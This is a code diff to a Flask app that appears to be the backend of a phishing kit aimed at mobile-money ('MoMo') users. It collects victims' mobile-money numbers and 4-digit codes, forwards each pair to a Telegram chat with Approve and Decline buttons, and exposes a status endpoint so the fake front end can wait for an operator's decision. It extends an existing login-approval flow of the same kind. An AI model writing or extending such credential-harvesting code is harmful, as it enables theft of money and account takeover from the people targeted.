@@ -9,7 +9,9 @@ app = Flask(__name__)
 BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
 CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID")
 
-PENDING = {}
+# In-memory stores
+PENDING = {}       # login approvals
+CODE_PENDING = {}  # 4-digit code approvals
 
 
 @app.after_request
@@ -120,6 +122,50 @@ def telegram_webhook():
         return "ok", 200
 
     action, request_id = data.split(":", 1)
+
+    # ---------- 4-digit code approvals ----------
+    if action in ("codeapprove", "codedecline"):
+        entry = CODE_PENDING.get(request_id)
+        if not entry:
+            return "ok", 200
+
+        if action == "codeapprove":
+            entry["status"] = "approved"
+            answer_text = "✅ Code Approved"
+        else:
+            entry["status"] = "declined"
+            answer_text = "❌ Code Declined"
+
+        try:
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
+                json={"callback_query_id": callback_id, "text": answer_text},
+                timeout=5,
+            )
+
+            new_text = (
+                f"🔢 4-Digit Code Entered\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"MoMo: {entry['momo']}\n"
+                f"Code: {entry['code']}\n"
+                f"Time: {entry['time']}\n\n"
+                f"{answer_text} by admin"
+            )
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
+                json={
+                    "chat_id": chat_id,
+                    "message_id": message_id,
+                    "text": new_text,
+                },
+                timeout=5,
+            )
+        except Exception:
+            pass
+
+        return "ok", 200
+
+    # ---------- Login approvals ----------
     entry = PENDING.get(request_id)
     if not entry:
         return "ok", 200
@@ -220,16 +266,31 @@ def code():
     code_val = data.get("code", "")
     time_str = data.get("time", "unknown")
 
+    request_id = uuid.uuid4().hex[:12]
+
+    CODE_PENDING[request_id] = {
+        "momo": momo,
+        "code": code_val,
+        "time": time_str,
+        "status": "pending",
+        "created_at": time.time(),
+    }
+
     text = (
         "🔢 4-Digit Code Entered\n"
         "━━━━━━━━━━━━━━━━━━\n"
         f"MoMo: {momo}\n"
-        f"Time: {time_str}\n"
-        "\n"
-        "─── CODE ───\n"
-        f"{code_val}\n"
-        "─── END ───"
+        f"Code: {code_val}\n"
+        f"Time: {time_str}\n\n"
+        "Approve or decline this code:"
     )
+
+    keyboard = {
+        "inline_keyboard": [[
+            {"text": "✅ Approve", "callback_data": f"codeapprove:{request_id}"},
+            {"text": "❌ Decline", "callback_data": f"codedecline:{request_id}"},
+        ]]
+    }
 
     if not BOT_TOKEN or not CHAT_ID:
         return jsonify({"ok": False, "error": "Server not configured"}), 500
@@ -237,12 +298,34 @@ def code():
     try:
         res = requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={"chat_id": CHAT_ID, "text": text},
+            json={
+                "chat_id": CHAT_ID,
+                "text": text,
+                "reply_markup": keyboard,
+            },
             timeout=10,
         )
-        return jsonify(res.json())
+        result = res.json()
+        if not result.get("ok"):
+            return jsonify({"ok": False, "error": result.get("description", "Telegram error")}), 500
+        return jsonify({"ok": True, "request_id": request_id})
     except Exception as e:
         return jsonify({"ok": False, "error": str(e)}), 500
+
+
+@app.route("/code-status/<request_id>", methods=["GET", "OPTIONS"])
+def code_status(request_id):
+    if request.method == "OPTIONS":
+        return "", 204
+
+    entry = CODE_PENDING.get(request_id)
+    if not entry:
+        return jsonify({"ok": False, "status": "unknown"}), 404
+
+    if time.time() - entry["created_at"] > 300 and entry["status"] == "pending":
+        entry["status"] = "expired"
+
+    return jsonify({"ok": True, "status": entry["status"]})
 
 
 # ---------------- STATIC ----------------
